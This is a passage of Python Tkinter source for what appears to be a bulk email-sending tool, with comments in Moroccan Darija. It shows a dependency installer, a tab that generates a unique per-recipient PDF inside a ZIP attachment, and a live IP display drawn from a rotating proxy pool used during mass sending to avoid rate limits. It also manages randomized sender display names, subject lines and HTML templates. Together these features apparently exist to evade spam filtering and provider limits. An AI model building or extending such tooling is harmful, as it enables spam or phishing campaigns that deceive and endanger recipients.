            return
        
        ok = 0
        missing = 0
        for pip_name, (status_lbl, import_name) in self._deps_rows.items():
            if _check_package(import_name):
                status_lbl.config(text="✅ Installed", fg=C["green"])
                ok += 1
            else:
                status_lbl.config(text="❌ Missing", fg=C["red"])
                missing += 1
        
        # Update status message (safety: check ila label exists)
        if not hasattr(self, '_deps_msg_lbl'):
            return
        
        if missing == 0:
            self._deps_msg_lbl.config(
                text=f"✅ All {ok} packages installed · App ready to use!",
                fg=C["green"])
        else:
            self._deps_msg_lbl.config(
                text=f"⚠ {missing} packages missing — Click 'Install Missing' bach t'fix",
                fg=C["yellow"])
    
    def _install_missing_deps(self):
        """Install ghir li mafichi installed"""
        # Find missing
        missing = []
        for pip_name, (status_lbl, import_name) in self._deps_rows.items():
            if not _check_package(import_name):
                missing.append(pip_name)
        
        if not missing:
            messagebox.showinfo("All Good!",
                "✅ Ga3 packages installed!\nMafichi 7aja t'install.")
            return
        
        if not messagebox.askyesno("Install Missing",
            f"Ghadi t'install {len(missing)} packages:\n\n" +
            "\n".join(f"  • {p}" for p in missing) +
            f"\n\nContinue?"):
            return
        
        # Show GUI installer
        self._run_dep_installer(missing, "Install Missing Packages")
    
    def _reinstall_all_deps(self):
        """Re-install ga3 packages (force)"""
        if not messagebox.askyesno("Re-install ALL",
            f"Ghadi reinstall ga3 {len(REQUIRED_PACKAGES)} packages?\n\n"
            f"Hadi ka't'use --force-reinstall flag.\n"
            f"Mufid ila kayna problemes.\n\n"
            f"Continue?"):
            return
        
        all_packages = list(REQUIRED_PACKAGES.keys())
        self._run_dep_installer(all_packages, "Re-install ALL Packages",
                                  force=True)
    
    def _run_dep_installer(self, packages, title, force=False):
        """Run installer m3a GUI progress window"""
        # Create progress window
        win = tk.Toplevel(self)
        win.title(f"📦 {title}")
        win.configure(bg=C["bg0"])
        
        w, h = 600, 420
        sw = win.winfo_screenwidth()
        sh = win.winfo_screenheight()
        x = (sw - w) // 2
        y = (sh - h) // 2
        win.geometry(f"{w}x{h}+{x}+{y}")
        win.transient(self)
        win.grab_set()
        
        # Header
        hdr = tk.Frame(win, bg=C["bg0"])
        hdr.pack(fill="x", padx=20, pady=(20, 10))
        
        tk.Label(hdr, text="📦 " + title,
                 bg=C["bg0"], fg=C["accent"],
                 font=("Segoe UI", 14, "bold")).pack(anchor="w")
        
        tk.Label(hdr,
                 text=f"Installing {len(packages)} packages...\nMa'tssyfetsh window — wait bash kolchi finish.",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 9),
                 justify="left").pack(anchor="w", pady=(4, 0))
        
        # Progress
        prog_frame = tk.Frame(win, bg=C["bg0"])
        prog_frame.pack(fill="x", padx=20, pady=10)
        
        prog_var = tk.DoubleVar(value=0)
        prog = ttk.Progressbar(prog_frame, variable=prog_var,
                                maximum=len(packages), length=560)
        prog.pack(fill="x")
        
        prog_lbl = tk.Label(prog_frame, text=f"0 / {len(packages)}",
                             bg=C["bg0"], fg=C["text"],
                             font=("Segoe UI", 10, "bold"))
        prog_lbl.pack(pady=(4, 0))
        
        # Log
        log_frame = tk.Frame(win, bg=C["bg2"])
        log_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        log_text = tk.Text(log_frame, bg=C["bg2"], fg=C["text"],
                            font=("Consolas", 9),
                            relief="flat", bd=0,
                            padx=12, pady=10,
                            height=10, wrap="word",
                            state="disabled")
        log_text.pack(fill="both", expand=True)
        
        # Status
        status_lbl = tk.Label(win, text="⏳ Starting...",
                               bg=C["bg0"], fg=C["yellow"],
                               font=("Segoe UI", 10, "bold"))
        status_lbl.pack(pady=(0, 16))
        
        # Close button (initially hidden)
        close_btn_frame = tk.Frame(win, bg=C["bg0"])
        
        def log(msg, color=C["text"]):
            log_text.configure(state="normal")
            log_text.insert("end", msg + "\n")
            tag = f"c_{id(msg)}_{random.randint(0,99999)}"
            log_text.tag_add(tag, "end-2l", "end-1l")
            log_text.tag_config(tag, foreground=color)
            log_text.see("end")
            log_text.configure(state="disabled")
            win.update()
        
        results = {"ok": 0, "failed": 0, "errors": []}
        
        def do_install():
            log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", C["text3"])
            log(f"📦 {title}", C["accent"])
            log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", C["text3"])
            log(f"Python: {sys.version.split()[0]}", C["text3"])
            log(f"Path: {sys.executable}", C["text3"])
            log(f"Packages: {len(packages)}", C["text3"])
            if force:
                log(f"Mode: --force-reinstall", C["yellow"])
            log(f"", C["text3"])
            
            for idx, pkg in enumerate(packages, 1):
                log(f"⏳ [{idx}/{len(packages)}] Installing {pkg}...", C["yellow"])
                status_lbl.config(text=f"⏳ Installing {pkg}... ({idx}/{len(packages)})")
                win.update()
                
                # Install m3a optional --force-reinstall
                try:
                    args = [sys.executable, '-m', 'pip', 'install', pkg, '--quiet']
                    if force:
                        args.insert(-1, '--force-reinstall')
                        args.insert(-1, '--no-deps')
                    
                    result = subprocess.run(
                        args, capture_output=True, text=True, timeout=120
                    )
                    success = (result.returncode == 0)
                    error = result.stderr if not success else ""
                except subprocess.TimeoutExpired:
                    success = False
                    error = "Timeout (120s)"
                except Exception as e:
                    success = False
                    error = str(e)
                
                if success:
                    log(f"   ✅ {pkg} installed!", C["green"])
                    results["ok"] += 1
                else:
                    log(f"   ❌ {pkg} FAILED", C["red"])
                    if error:
                        log(f"      Error: {error[:200]}", C["red"])
                    results["failed"] += 1
                    results["errors"].append((pkg, error))
                
                prog_var.set(idx)
                prog_lbl.config(text=f"{idx} / {len(packages)}")
                win.update()
            
            log(f"", C["text3"])
            log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", C["text3"])
            if results["failed"] == 0:
                log(f"🎉 ALL PACKAGES INSTALLED SUCCESSFULLY!", C["green"])
                status_lbl.config(text="✅ Done!", fg=C["green"])
                self._log(f"📦 Installed {results['ok']} packages successfully", C["green"])
            else:
                log(f"⚠ {results['ok']} ok · {results['failed']} failed", C["yellow"])
                status_lbl.config(text="⚠ Some failed", fg=C["yellow"])
                self._log(f"⚠ Installed {results['ok']}/{len(packages)} packages", C["yellow"])
            log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", C["text3"])
            log(f"", C["text3"])
            log(f"⚠ IMPORTANT: Restart app bach changes y'apply!", C["yellow"])
            
            # Show close button
            close_btn_frame.pack(pady=(0, 10))
            tk.Button(close_btn_frame, text="✓ Close",
                      bg=C["accent"], fg="#fff",
                      relief="flat", bd=0, cursor="hand2",
                      font=("Segoe UI", 11, "bold"),
                      command=lambda: [win.destroy(), self._refresh_deps_status()]).pack(side="left",
                                                                                            ipady=8, ipadx=20, padx=4)
        
        # Run install after window mounts
        win.after(500, do_install)
    
    def _build_auto_pdf_tab(self, parent):
        """📄 Auto PDF Attachment — entire dedicated tab"""
        main = tk.Frame(parent, bg=C["bg0"])
        main.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Header
        hdr = tk.Frame(main, bg=C["bg0"])
        hdr.pack(fill="x", pady=(0, 16))
        tk.Label(hdr, text="📄 Auto PDF Attachment",
                 bg=C["bg0"], fg=C["green"],
                 font=("Segoe UI", 16, "bold")).pack(side="left")
        tk.Label(hdr, text="  ·  Per email = unique PDF + ZIP",
                 bg=C["bg0"], fg=C["text3"],
                 font=("Segoe UI", 10, "italic")).pack(side="left", pady=(8,0))
        
        # Card
        card = tk.Frame(main, bg=C["bg1"])
        card.pack(fill="both", expand=True)
        cpad = tk.Frame(card, bg=C["bg1"])
        cpad.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Top: Enable + status
        top_row = tk.Frame(cpad, bg=C["bg1"])
        top_row.pack(fill="x", pady=(0, 14))
        
        tk.Checkbutton(top_row, text="✅ Enable Auto PDF",
                       variable=self.auto_html_enabled,
                       bg=C["bg1"], fg=C["green"],
                       activeforeground=C["green"],
                       selectcolor=C["bg3"], activebackground=C["bg1"],
                       font=("Segoe UI", 12, "bold")).pack(side="left")
        
        if PDF_OK:
            tk.Label(top_row, text="  ·  ✅ reportlab installed · Beautiful PDFs ready",
                     bg=C["bg1"], fg=C["green"],
                     font=("Segoe UI", 9)).pack(side="left", padx=(12,0))
        else:
            tk.Label(top_row, text="  ·  ⚠️ reportlab missing · pip install reportlab",
                     bg=C["bg1"], fg=C["red"],
                     font=("Segoe UI", 9, "bold")).pack(side="left", padx=(12,0))
        
        # 2 Columns
        body = tk.Frame(cpad, bg=C["bg1"])
        body.pack(fill="both", expand=True)
        
        # LEFT: Links + URL Generator
        left = tk.Frame(body, bg=C["bg1"])
        left.pack(side="left", fill="both", expand=True, padx=(0, 10))
        
        tk.Label(left, text="🔗 Links (1 per line):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 4))
        
        links_wrap = tk.Frame(left, bg=C["accent"], padx=2, pady=2)
        links_wrap.pack(fill="both", expand=True, pady=(0, 10))
        
        new_links = tk.Text(links_wrap, font=("Consolas", 10),
                             bg=C["input"], fg=C["text"],
                             insertbackground=C["accent"],
                             relief="flat", bd=0,
                             highlightthickness=0,
                             wrap="none")
        new_links.pack(fill="both", expand=True)
        # Copy old text content
        try:
            old_content = self.auto_html_links_text.get("1.0", "end").strip()
            if old_content:
                new_links.insert("1.0", old_content)
        except: pass
        self.auto_html_links_text = new_links
        
        # URL Generator
        gen_box = tk.Frame(left, bg=C["bg2"])
        gen_box.pack(fill="x", pady=(0, 8))
        gen_inner = tk.Frame(gen_box, bg=C["bg2"])
        gen_inner.pack(fill="x", padx=12, pady=10)
        
        tk.Label(gen_inner, text="🛠️ URL Generator (1 → N):",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 9, "bold")).pack(anchor="w", pady=(0, 4))
        
        tk.Entry(gen_inner, textvariable=self.gen_base_url,
                 font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=4, pady=(0, 6))
        
        range_row = tk.Frame(gen_inner, bg=C["bg2"])
        range_row.pack(fill="x")
        tk.Label(range_row, text="From:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 4))
        tk.Entry(range_row, textvariable=self.gen_start,
                 font=("Segoe UI", 9), width=6,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(side="left", ipady=3, padx=(0, 8))
        
        tk.Label(range_row, text="To:", bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9)).pack(side="left", padx=(0, 4))
        tk.Entry(range_row, textvariable=self.gen_end,
                 font=("Segoe UI", 9), width=6,
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(side="left", ipady=3, padx=(0, 8))
        
        tk.Button(range_row, text="⚡ Generate",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 9, "bold"),
                  command=self._generate_url_list).pack(side="left", ipady=4, ipadx=10)
        
        # Buttons
        btn_row = tk.Frame(left, bg=C["bg1"])
        btn_row.pack(fill="x")
        for txt, cmd, color, fg in [("📂 Import .txt", self._import_auto_html_links, C["bg3"], C["text"]),
                                       ("🧪 Preview", self._preview_auto_html, C["accent"], "#000"),
                                       ("🗑 Clear", lambda: self.auto_html_links_text.delete("1.0", "end"), C["red"], "#fff")]:
            tk.Button(btn_row, text=txt, bg=color, fg=fg,
                      relief="flat", bd=0, cursor="hand2",
                      font=("Segoe UI", 9, "bold"),
                      command=cmd).pack(side="left", ipady=6, ipadx=10, padx=(0, 6))
        
        new_count = tk.Label(left, text="0 links",
                              bg=C["bg1"], fg=C["text3"],
                              font=("Segoe UI", 9, "italic"))
        new_count.pack(anchor="w", pady=(6, 0))
        self.auto_html_count_lbl = new_count
        new_links.bind("<KeyRelease>", self._update_auto_html_count)
        self._update_auto_html_count()
        
        # RIGHT: Filename + Bulk ZIP
        right = tk.Frame(body, bg=C["bg1"], width=380)
        right.pack(side="left", fill="y", padx=(10, 0))
        right.pack_propagate(False)
        
        tk.Label(right, text="📄 Filename (kayd3em [NAME]):",
                 bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", pady=(0, 4))
        
        tk.Entry(right, textvariable=self.auto_html_filename,
                 font=("Segoe UI", 10),
                 bg=C["input"], fg=C["text"],
                 insertbackground=C["accent"],
                 relief="flat", bd=0,
                 highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5, pady=(0, 14))
        
        # Bulk ZIP card
        zip_card = tk.Frame(right, bg=C["bg2"])
        zip_card.pack(fill="x", pady=(0, 10))
        zip_inner = tk.Frame(zip_card, bg=C["bg2"])
        zip_inner.pack(fill="x", padx=14, pady=14)
        
        tk.Label(zip_inner, text="📦 Bulk Generate → ZIP",
                 bg=C["bg2"], fg=C["accent2"],
                 font=("Segoe UI", 11, "bold")).pack(anchor="w", pady=(0, 6))
        
        tk.Label(zip_inner,
                 text="Generate {N} ZIPs (1 per link)\n📧 Per email = different ZIP rotated\nPDF inside = REAL [NAME] [EMAIL]",
                 bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI", 9),
                 justify="left").pack(anchor="w", pady=(0, 8))
        
        tk.Label(zip_inner,
                 text="⚠ ZIP attachments = lower deliverability\n   Test l'awwal m3a personal emails!",
                 bg=C["bg2"], fg=C["yellow"],
                 font=("Segoe UI", 8),
                 justify="left").pack(anchor="w", pady=(0, 10))
        
        zip_btns = tk.Frame(zip_inner, bg=C["bg2"])
        zip_btns.pack(fill="x")
        tk.Button(zip_btns, text="⚡ Generate ZIP",
                  bg=C["green"], fg="#000",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=self._generate_zip_pdfs).pack(side="left", ipady=8, ipadx=14, padx=(0, 6))
        
        tk.Button(zip_btns, text="📂 Folder",
                  bg=C["bg3"], fg=C["accent2"],
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10),
                  command=self._open_zip_folder).pack(side="left", ipady=8, ipadx=10)
        
        new_zip_status = tk.Label(zip_inner, text="No ZIP generated yet",
                                    bg=C["bg2"], fg=C["text3"],
                                    font=("Segoe UI", 8, "italic"),
                                    wraplength=320, justify="left")
        new_zip_status.pack(anchor="w", pady=(8, 0))
        self.zip_status_lbl = new_zip_status

    def _clear_console(self):
        """Clear console text"""
        try:
            self.console.config(state="normal")
            self.console.delete("1.0", "end")
            self.console.config(state="disabled")
        except: pass
    
    def _refresh_live_ip(self):
        """
        Force refresh dyal Live IP — uses POOL, not direct API.
        Bach mafichi y'rate-limit f mass send.
        """
        if not hasattr(self, 'proxy_tab'):
            return
        
        if not self.proxy_tab.enabled.get():
            self.live_ip_lbl.config(text="—", fg=C["text3"])
            self.live_ip_status.config(text="Proxy disabled", fg=C["text3"])
            return
        
        # Show loading
        self.live_ip_lbl.config(text="⏳ Loading from pool...", fg=C["yellow"])
        self.live_ip_status.config(text="Getting cached proxy...", fg=C["yellow"])
        
        def _do():
            try:
                if self.proxy_tab.proxy_mode.get() == "api_url":
                    # 🎯 USE POOL (mafichi direct API call!)
                    proxy = self.proxy_tab._get_pooled_proxy()
                    
                    if not proxy:
                        # Pool empty — try cached
                        cached = self.proxy_tab.get_last_ip()
                        if cached:
                            self.after(0, lambda c=cached: self.live_ip_lbl.config(
                                text=f"📦 Cached", fg=C["yellow"]))
                            self.after(0, lambda c=cached: self.live_ip_status.config(
                                text=f"⚠ Pool empty · last: {c[:50]}", fg=C["yellow"]))
                        else:
                            self.after(0, lambda: self.live_ip_lbl.config(
                                text="✗ No proxy", fg=C["red"]))
                            self.after(0, lambda: self.live_ip_status.config(
                                text="Pool empty + API blocked", fg=C["red"]))
                        return
                    
                    proxy_str = f"{proxy['host']}:{proxy['port']}"
                    pool_info = self.proxy_tab.get_pool_info()
                    
                    # Show pool info
                    self.after(0, lambda p=proxy_str: self.live_ip_lbl.config(
                        text=f"🔄 Verifying...", fg=C["yellow"]))
                    self.after(0, lambda pi=pool_info: self.live_ip_status.config(
                        text=f"Got pool [{pi['current_index']+1}/{pi['size']}] · verifying...", fg=C["yellow"]))
                    
                    # Verify real IP through this pooled proxy
                    real_ip = self.proxy_tab.fetch_real_ip(proxy)
                    
                    from datetime import datetime
                    time_str = datetime.now().strftime("%H:%M:%S")
                    
                    if real_ip and not real_ip.startswith("err:") and "<" not in real_ip and len(real_ip) < 50:
                        # ✅ Real IP confirmed!
                        self.after(0, lambda r=real_ip: self.live_ip_lbl.config(
                            text=f"🌐 {r}", fg=C["green"]))
                        pi = self.proxy_tab.get_pool_info()
                        age = pi.get('last_refresh_age', 0) if pi else 0
                        self.after(0, lambda p=proxy_str, t=time_str, pi=pi, a=age:
                                   self.live_ip_status.config(
                                       text=f"✅ VERIFIED @ {t} · pool [{pi['size']} IPs · {a}s old]",
                                       fg=C["green"]))
                        self._log(f"✅ Live IP: {real_ip} (via {proxy_str})", C["green"])
                    elif real_ip and real_ip.startswith("err:"):
                        err = real_ip[4:][:40]
                        self.after(0, lambda p=proxy_str: self.live_ip_lbl.config(
                            text=f"⚠ {p}", fg=C["yellow"]))
                        self.after(0, lambda e=err: self.live_ip_status.config(
                            text=f"⚠ Proxy got walakin connect: {e}",
                            fg=C["yellow"]))
                    else:
                        self.after(0, lambda p=proxy_str: self.live_ip_lbl.config(
                            text=f"⚠ {p}", fg=C["yellow"]))
                        self.after(0, lambda: self.live_ip_status.config(
                            text="⚠ Got proxy walakin verify failed",
                            fg=C["yellow"]))
                else:
                    # List mode
                    if not self.proxy_tab.proxy_list:
                        self.after(0, lambda: self.live_ip_lbl.config(text="✗ Empty", fg=C["red"]))
                        self.after(0, lambda: self.live_ip_status.config(
                            text="No proxies in list", fg=C["red"]))
                        return
                    
                    proxy = random.choice(self.proxy_tab.proxy_list)
                    real_ip = self.proxy_tab.fetch_real_ip(proxy)
                    
                    from datetime import datetime
                    time_str = datetime.now().strftime("%H:%M:%S")
                    
                    if real_ip and not real_ip.startswith("err:") and "<" not in real_ip:
                        self.after(0, lambda r=real_ip: self.live_ip_lbl.config(
                            text=f"🌐 {r}", fg=C["green"]))
                        self.after(0, lambda t=time_str, n=len(self.proxy_tab.proxy_list):
                                   self.live_ip_status.config(
                                       text=f"✅ Verified @ {t} · {n} proxies in list",
                                       fg=C["green"]))
                    else:
                        self.after(0, lambda: self.live_ip_lbl.config(
                            text="⚠ Issue", fg=C["yellow"]))
                        self.after(0, lambda: self.live_ip_status.config(
                            text="Failed to verify real IP", fg=C["yellow"]))
            except Exception as e:
                err = str(e)[:40]
                self.after(0, lambda: self.live_ip_lbl.config(text="✗ Error", fg=C["red"]))
                self.after(0, lambda er=err: self.live_ip_status.config(text=er, fg=C["red"]))
        
        threading.Thread(target=_do, daemon=True).start()
    
    def _start_live_ip_tick(self):
        """
        Tick mlli SEND khdama — light update b cached IP info.
        Mafichi y'fetch fresh proxy! Yghir y'show stat dyal pool.
        """
        try:
            if hasattr(self, 'proxy_tab') and self.proxy_tab.enabled.get():
                if hasattr(self, '_sending') and self._sending:
                    # Light update — show current pool state b'la fetch
                    pool_info = self.proxy_tab.get_pool_info()
                    cached = self.proxy_tab.get_last_ip()
                    
                    if pool_info and pool_info.get('current_ip'):
                        from datetime import datetime
                        time_str = datetime.now().strftime("%H:%M:%S")
                        current = pool_info['current_ip']
                        size = pool_info['size']
                        idx = pool_info['current_index'] + 1
                        age = pool_info.get('last_refresh_age', 0)
                        
                        self.live_ip_lbl.config(text=f"🌐 {current}", fg=C["green"])
                        self.live_ip_status.config(
                            text=f"⏱ Live SEND @ {time_str} · pool [{idx}/{size}] · {age}s old",
                            fg=C["green"])
                    elif cached:
                        from datetime import datetime
                        time_str = datetime.now().strftime("%H:%M:%S")
                        self.live_ip_lbl.config(text=f"📦 {cached[:30]}", fg=C["yellow"])
                        self.live_ip_status.config(
                            text=f"⏱ SEND @ {time_str} · using cached", fg=C["yellow"])
        except: pass
        # Re-schedule kol 5 thawani (light, mafichi rate-limit)
        self.after(5000, self._start_live_ip_tick)
    
    def _make_stat(self, parent, label, value, color):
        f = tk.Frame(parent, bg=C["bg2"], padx=12, pady=8)
        f.pack(side="left", fill="x", expand=True, padx=(0,8))
        tk.Label(f, text=label, bg=C["bg2"], fg=C["text3"],
                 font=("Segoe UI",8)).pack()
        lbl = tk.Label(f, text=value, bg=C["bg2"], fg=color,
                       font=("Segoe UI",16,"bold"))
        lbl.pack()
        return lbl

    def _toggle_subj(self):
        if self.subj_mode.get() == "manual":
            self.subj_random_f.pack_forget()
            self.subj_manual_f.pack(fill="x")
        else:
            self.subj_manual_f.pack_forget()
            self.subj_random_f.pack(fill="x")

    def _load_subjects(self):
        path = filedialog.askopenfilename(
            filetypes=[("Text","*.txt"),("All","*.*")])
        if path:
            with open(path, encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
            self.subject_list = lines
            self.subj_file_var.set(os.path.basename(path))
            self.subj_count_lbl.config(text=f"{len(lines)} subjects", fg=C["green"])
            self._log(f"📋 {len(lines)} subjects loaded", C["accent2"])
    
    # ─── DISPLAY NAME (Integrated) ─────────────────────────────
    def _toggle_dn(self):
        """Switch entre Manual w Random display name"""
        if self.dn_mode.get() == "manual":
            self.dn_random_f.pack_forget()
            self.dn_manual_f.pack(fill="x")
        else:
            self.dn_manual_f.pack_forget()
            self.dn_random_f.pack(fill="x")
    
    def _get_dn_list(self):
        """Get current list mn integrated textbox"""
        text = self.dn_text.get("1.0", "end-1c").strip()
        if not text:
            return []
        return [line.strip() for line in text.split("\n") if line.strip()]
    
    def _update_dn_count(self):
        """Update counter live"""
        names = self._get_dn_list()
        self.dn_count_lbl.config(text=f"{len(names)} names",
                                  fg=C["green"] if names else C["text3"])
    
    def _import_display_names(self):
        """Import names mn .txt file (append l existing)"""
        path = filedialog.askopenfilename(
            filetypes=[("Text","*.txt"),("All","*.*")])
        if not path:
            return
        try:
            with open(path, encoding="utf-8") as f:
                new_names = [l.strip() for l in f if l.strip()]
            
            # Append l existing
            existing = self._get_dn_list()
            combined = list(dict.fromkeys(existing + new_names))  # dedupe, keep order
            
            self.dn_text.delete("1.0", "end")
            self.dn_text.insert("1.0", "\n".join(combined))
            self._update_dn_count()
            self._log(f"👤 Imported {len(new_names)} names ({len(combined)} total)", C["green"])
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def _clear_display_names(self):
        """Clear ga3 names"""
        if self._get_dn_list() and not messagebox.askyesno("Confirm", "Clear ga3 names?"):
            return
        self.dn_text.delete("1.0", "end")
        self._update_dn_count()
    
    # ─── SUBJECTS (Integrated) ─────────────────────────────────
    def _get_subj_list(self):
        """Get subjects mn integrated textbox"""
        text = self.subj_text.get("1.0", "end-1c").strip()
        if not text:
            return []
        return [line.strip() for line in text.split("\n") if line.strip()]
    
    def _update_subj_count(self):
        """Update counter live"""
        subjects = self._get_subj_list()
        self.subj_count_lbl.config(text=f"{len(subjects)} subjects",
                                    fg=C["green"] if subjects else C["text3"])
    
    def _import_subjects(self):
        """Import subjects mn .txt (append)"""
        path = filedialog.askopenfilename(
            filetypes=[("Text","*.txt"),("All","*.*")])
        if not path:
            return
        try:
            with open(path, encoding="utf-8") as f:
                new_subs = [l.strip() for l in f if l.strip()]
            
            existing = self._get_subj_list()
            combined = list(dict.fromkeys(existing + new_subs))
            
            self.subj_text.delete("1.0", "end")
            self.subj_text.insert("1.0", "\n".join(combined))
            self._update_subj_count()
            self._log(f"📋 Imported {len(new_subs)} subjects ({len(combined)} total)", C["green"])
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def _clear_subjects(self):
        """Clear ga3 subjects"""
        if self._get_subj_list() and not messagebox.askyesno("Confirm", "Clear ga3 subjects?"):
            return
        self.subj_text.delete("1.0", "end")
        self._update_subj_count()
    
    # Old _load_subjects kept l backward compat (mafichi used daba)
    def _load_subjects(self):
        self._import_subjects()
    
    # ─── TEMPLATES (Integrated, Unlimited) ─────────────────────
    def _toggle_body(self):
        """Switch entre Manual w Random templates"""
        if self.body_mode.get() == "manual":
            self.body_random_f.pack_forget()
            self.body_manual_f.pack(fill="x")
        else:
            self.body_manual_f.pack_forget()
            self.body_random_f.pack(fill="x")
    
    def _update_body_count(self):
        """Update template counter"""
        n = len(self.body_templates_list)
        self.body_count_lbl.config(text=f"{n} template{'s' if n != 1 else ''}",
                                    fg=C["green"] if n else C["text3"])
    
    def _refresh_body_listbox(self):
        """Refresh listbox display"""
        self.body_listbox.delete(0, tk.END)
        for i, t in enumerate(self.body_templates_list, 1):
            preview = t['content'][:80].replace('\n', ' ').replace('\r', '')
            self.body_listbox.insert(tk.END, f"{i:3d}. {t['filename']} — {preview}...")
        self._update_body_count()
    
    def _add_template(self):
        """Add template via dialog (paste HTML directly)"""
        dlg = tk.Toplevel(self)
        dlg.title("Add HTML Template")
        dlg.geometry("700x500")
        dlg.configure(bg=C["bg1"])
        dlg.transient(self.winfo_toplevel())
        dlg.grab_set()
        
        # Header
        tk.Label(dlg, text="➕ Add HTML Template", bg=C["bg1"], fg=C["text"],
                 font=("Segoe UI", 12, "bold")).pack(pady=(15, 8))
        
        # Name field
        name_f = tk.Frame(dlg, bg=C["bg1"])
        name_f.pack(fill="x", padx=20, pady=(0, 8))
        tk.Label(name_f, text="Template name:", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w")
        name_var = tk.StringVar(value=f"template_{len(self.body_templates_list)+1}.html")
        tk.Entry(name_f, textvariable=name_var, font=("Segoe UI", 9),
                 bg=C["input"], fg=C["text"], insertbackground=C["accent"],
                 relief="flat", bd=0, highlightthickness=1,
                 highlightbackground=C["border2"]).pack(fill="x", ipady=5)
        
        # Content textarea
        tk.Label(dlg, text="HTML content:", bg=C["bg1"], fg=C["text2"],
                 font=("Segoe UI", 9)).pack(anchor="w", padx=20, pady=(8, 2))
        
        content_f = tk.Frame(dlg, bg=C["bg1"])
        content_f.pack(fill="both", expand=True, padx=20, pady=(0, 8))
        
        scrollbar = tk.Scrollbar(content_f)
        scrollbar.pack(side="right", fill="y")
        
        content_text = tk.Text(content_f, bg=C["input"], fg=C["text"],
                                font=("Consolas", 9), insertbackground=C["accent"],
                                relief="flat", bd=0, highlightthickness=1,
                                highlightbackground=C["border2"],
                                yscrollcommand=scrollbar.set, wrap="word")
        content_text.pack(side="left", fill="both", expand=True)
        scrollbar.config(command=content_text.yview)
        
        content_text.focus()
        
        # Buttons
        btn_f = tk.Frame(dlg, bg=C["bg1"])
        btn_f.pack(fill="x", padx=20, pady=(0, 15))
        
        def do_save():
            name = name_var.get().strip() or f"template_{len(self.body_templates_list)+1}.html"
            content = content_text.get("1.0", "end").strip()
            if not content:
                messagebox.showwarning("Empty", "HTML content fargha!", parent=dlg)
                return
            self.body_templates_list.append({
                'filename': name,
                'content': content
            })
            self._refresh_body_listbox()
            self._log(f"➕ Added: {name} ({len(self.body_templates_list)} total)", C["green"])
            dlg.destroy()
        
        tk.Button(btn_f, text="💾 Save", bg=C["green"], fg="white",
                  relief="flat", bd=0, cursor="hand2",
                  font=("Segoe UI", 10, "bold"),
                  command=do_save).pack(side="left", ipady=6, ipadx=20, padx=(0, 6))
        
        tk.Button(btn_f, text="Cancel", bg=C["bg3"], fg=C["text2"],
                  relief="flat", bd=0, cursor="hand2", font=("Segoe UI", 10),
                  command=dlg.destroy).pack(side="left", ipady=6, ipadx=20)
    
    def _import_template_file(self):
        """Import a single .html file as template"""
        paths = filedialog.askopenfilenames(
            title="Select HTML files (multiple OK)",
            filetypes=[("HTML", "*.html *.htm"), ("All", "*.*")]
        )
        if not paths:
            return
        added = 0
        for path in paths:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                if content.strip():
                    self.body_templates_list.append({
                        'filename': os.path.basename(path),
                        'content': content
                    })
                    added += 1
            except Exception as e:
                self._log(f"⚠ Skip {os.path.basename(path)}: {e}", C["yellow"])
        if added:
            self._refresh_body_listbox()
            self._log(f"📂 Imported {added} template(s) ({len(self.body_templates_list)} total)", C["green"])
    
    def _load_templates_folder(self):
        """Load ga3 HTML templates mn folder"""
        folder = filedialog.askdirectory(title="Select folder fih HTML templates")
        if not folder:
            return
        
        added = 0
        try:
            for fname in sorted(os.listdir(folder)):
                if fname.lower().endswith(('.html', '.htm')):
                    fpath = os.path.join(folder, fname)
                    try:
                        with open(fpath, 'r', encoding='utf-8') as f:
                            content = f.read()
                        if content.strip():
                            self.body_templates_list.append({
                                'filename': fname,
                                'content': content
                            })
                            added += 1
                    except Exception as e:
                        self._log(f"⚠ Skip {fname}: {e}", C["yellow"])
            
            if added:
                self._refresh_body_listbox()
                self._log(f"📁 Loaded {added} template(s) mn {os.path.basename(folder)} ({len(self.body_templates_list)} total)", C["green"])
            else:
                messagebox.showwarning("Empty", "Folder mafich fih .html files")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    
    def _clear_templates(self):
        """Clear ga3 templates"""
        if self.body_templates_list and not messagebox.askyesno(
            "Confirm", f"Clear ga3 {len(self.body_templates_list)} templates?"):
            return
        self.body_templates_list.clear()
        self._refresh_body_listbox()
    
    def _template_right_click(self, event):
        """Right-click → delete selected template"""
        try:
            self.body_listbox.selection_clear(0, tk.END)
            idx = self.body_listbox.nearest(event.y)
            self.body_listbox.selection_set(idx)
            
